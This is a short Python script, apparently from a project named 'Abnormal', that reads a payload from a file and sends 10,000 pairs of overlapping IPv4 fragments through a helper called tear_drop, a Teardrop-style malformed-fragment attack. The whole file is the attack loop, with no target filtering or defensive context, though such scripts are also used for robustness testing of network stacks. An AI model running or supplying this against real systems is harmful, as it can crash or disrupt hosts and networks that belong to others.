# #!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Project -> @File : Abnormal -> main.py
# @Author   : Taknife
# @IDE      : PyCharm
# @Time     : 2022/9/28 14:28

"""
-------------------- Function --------------------
Desc: 
---------------------- End -----------------------
"""

from crafting_packets.ipv4_exception_packets import *
from crafting_packets.send_exception_packets import send_packets
import time


if __name__ == '__main__':
    with open("data.txt", "r") as f:
        data = f.read()
        # print(data)
    for i in range(0, 10000):
        pkt = tear_drop(1, 0, 17, data=data)
        send_packets(pkt)
        pkt = tear_drop(1, 176, 17, data=data)
        send_packets(pkt)
        time.sleep(0.05)